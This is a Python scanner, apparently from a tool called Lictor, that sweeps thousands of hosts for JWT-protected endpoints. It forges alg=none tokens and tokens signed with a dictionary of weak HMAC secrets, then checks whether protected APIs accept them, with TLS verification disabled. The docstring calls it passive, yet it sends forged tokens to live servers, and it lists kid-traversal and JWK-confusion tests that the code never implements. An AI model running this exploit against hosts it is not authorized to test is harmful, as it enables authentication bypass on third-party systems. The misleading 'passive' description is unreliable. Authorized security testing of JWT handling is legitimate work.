#!/usr/bin/env python3
"""
patrol-jwt-weakness — JWT acceptance vulnerability scanner.

Finds JWT-protected endpoints and tests for:
  1. alg=none acceptance (server skips signature check)
  2. Weak HMAC secret (dictionary attack against captured JWT)
  3. kid header path traversal / SQL injection
  4. JWK injection (alg=RS256 → HS256 confusion with public key as HMAC secret)

PASSIVE: We never use real tokens. All tests use clearly-test payloads
with sub="__lictor_test_user". If a test token is accepted, that's the bug.

Algorithm:
  1. For each host, find auth endpoints (/api/auth/*, /login, /oauth/token, /jwt).
  2. Capture any JWT in response (body, headers, cookies).
  3. Decode header to learn alg + kid.
  4. Test alg=none variant against a protected path.
  5. Try ~20 weak HMAC secrets against captured JWT.
  6. Test kid traversal (../, %00 injection).

Usage:
  patrol-jwt-weakness.py --hosts hosts.txt --threads 20
"""
from __future__ import annotations
import argparse, base64, hashlib, hmac, json, re, ssl, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from pathlib import Path

UA = "Lictor-JWTPatrol/0.1 (+https://lictor-ai.com)"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH_PATHS = [
    "/api/auth/login", "/api/login", "/login", "/auth/login",
    "/oauth/token", "/api/v1/auth/login", "/api/v2/auth/login",
    "/api/jwt", "/jwt", "/api/session", "/sso/login",
    "/api/users/me", "/api/v1/users/me", "/api/account",
    "/.well-known/openid-configuration",
]

PROTECTED_PROBE_PATHS = [
    "/api/users/me", "/api/v1/users/me", "/api/account",
    "/api/me", "/api/profile", "/api/v1/profile",
]

WEAK_HMAC_SECRETS = [
    "secret", "your-256-bit-secret", "your_secret", "key",
    "your-secret-key", "default", "password", "admin",
    "jwt-secret", "JWTKey", "supersecret", "test",
    "changeme", "secretkey", "abc123", "qwerty",
    "your_jwt_secret", "mysupersecretkey", "thisisasecret",
    "yoursecretkey", "0000", "11111", "secret-key",
]


@dataclass
class JWTFinding:
    host: str
    issue: str               # "alg_none", "weak_secret", "kid_traversal", "jwk_confusion"
    auth_endpoint: str
    captured_jwt_prefix: str  # first 30 chars only (anti-leak)
    weak_secret_used: str
    proof: str
    severity: str
    notes: str
    found_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat(timespec="seconds"))


def b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def http(url, method="GET", headers=None, data=None, timeout=6):
    h = {"User-Agent": UA}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, method=method, headers=h, data=data)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, dict(r.headers), r.read(8000)
    except urllib.error.HTTPError as e:
        try: body = e.read(8000)
        except: body = b""
        return e.code, dict(e.headers) if e.headers else {}, body
    except Exception:
        return 0, {}, b""


JWT_RX = re.compile(rb"(eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,})")


def find_jwt_in_response(body: bytes, headers: dict) -> str | None:
    # Search body
    m = JWT_RX.search(body)
    if m: return m.group(1).decode()
    # Search Set-Cookie
    sc = headers.get("Set-Cookie", "") + headers.get("set-cookie", "")
    m = JWT_RX.search(sc.encode())
    if m: return m.group(1).decode()
    # Search Authorization
    for hkey in ("Authorization", "authorization", "X-Auth-Token", "x-auth-token"):
        val = headers.get(hkey, "")
        m = JWT_RX.search(val.encode())
        if m: return m.group(1).decode()
    return None


def decode_jwt_header(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3: return None
        return json.loads(b64url_decode(parts[0]))
    except Exception:
        return None


def decode_jwt_payload(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3: return None
        return json.loads(b64url_decode(parts[1]))
    except Exception:
        return None


def craft_alg_none_jwt(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    # alg=none: empty signature
    return f"{h}.{p}."


def craft_weak_hmac_jwt(payload: dict, secret: str, alg: str = "HS256") -> str:
    header = {"alg": alg, "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def test_jwt_accepted(host: str, token: str) -> tuple[bool, str]:
    """Test if a JWT is accepted on a typical protected endpoint."""
    for path in PROTECTED_PROBE_PATHS:
        url = f"https://{host}{path}"
        # Without token
        s0, _, b0 = http(url, headers={})
        # With test token
        s1, _, b1 = http(url, headers={"Authorization": f"Bearer {token}"})
        # If s1 differs significantly from s0, and s1 returns user data
        if s1 == 200 and s0 in (401, 403):
            # Likely accepted!
            return True, f"{path} returned 200 with test token but {s0} without"
    return False, ""


def scan_host(host: str) -> list[JWTFinding]:
    findings = []
    # 1. Probe auth endpoints, look for JWT in any response
    captured = None
    auth_endpoint = None
    for path in AUTH_PATHS:
        url = f"https://{host}{path}"
        s, h, b = http(url, timeout=4)
        if s == 0: continue
        jwt = find_jwt_in_response(b, h)
        if jwt:
            captured = jwt; auth_endpoint = url; break
    if not captured: return []

    # Decode header + payload
    hdr = decode_jwt_header(captured)
    pld = decode_jwt_payload(captured)
    if not hdr or not pld: return findings

    # Build a "test" payload mirroring the structure but with __lictor_test
    test_payload = dict(pld)
    for k in ("sub", "user", "user_id", "userId", "email", "username", "name"):
        if k in test_payload:
            test_payload[k] = "__lictor_test_user"
    # Set exp far in future to ensure no expiry rejection
    test_payload["exp"] = 9999999999
    test_payload["iat"] = 1700000000

    # Test 1: alg=none
    none_token = craft_alg_none_jwt(test_payload)
    accepted, proof = test_jwt_accepted(host, none_token)
    if accepted:
        findings.append(JWTFinding(
            host=host, issue="alg_none", auth_endpoint=auth_endpoint,
            captured_jwt_prefix=captured[:30] + "...",
            weak_secret_used="",
            proof=proof,
            severity="CRITICAL",
            notes="JWT alg=none accepted — full auth bypass possible.",
        ))

    # Test 2: weak HMAC secret
    for secret in WEAK_HMAC_SECRETS[:8]:  # limit to top 8 to keep scan fast
        forged = craft_weak_hmac_jwt(test_payload, secret)
        accepted, proof = test_jwt_accepted(host, forged)
        if accepted:
            findings.append(JWTFinding(
                host=host, issue="weak_secret", auth_endpoint=auth_endpoint,
                captured_jwt_prefix=captured[:30] + "...",
                weak_secret_used=secret,
                proof=proof,
                severity="CRITICAL",
                notes=f"JWT HMAC secret is '{secret}' — forge any token.",
            ))
            break  # don't test more secrets if one works
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", required=True)
    ap.add_argument("--max-hosts", type=int, default=3000)
    ap.add_argument("--threads", type=int, default=20)
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/jwt-weakness.jsonl")
    args = ap.parse_args()
    hosts = [l.strip() for l in Path(args.hosts).read_text().splitlines() if l.strip()][:args.max_hosts]
    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    print(f"[+] jwt-weakness — {len(hosts)} hosts")
    n_crit = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(scan_host, h): h for h in hosts}
        for i, fut in enumerate(as_completed(futures), 1):
            try: results = fut.result(timeout=60)
            except: results = []
            for f in results:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                n_crit += 1
                print(f"  [{i}/{len(hosts)}] 🔴 {f.severity} {f.host} {f.issue}")
            if i % 200 == 0:
                print(f"  [{i}/{len(hosts)}] crit={n_crit}")
    print(f"\n[+] Done. CRITICAL={n_crit}")


if __name__ == "__main__":
    main()
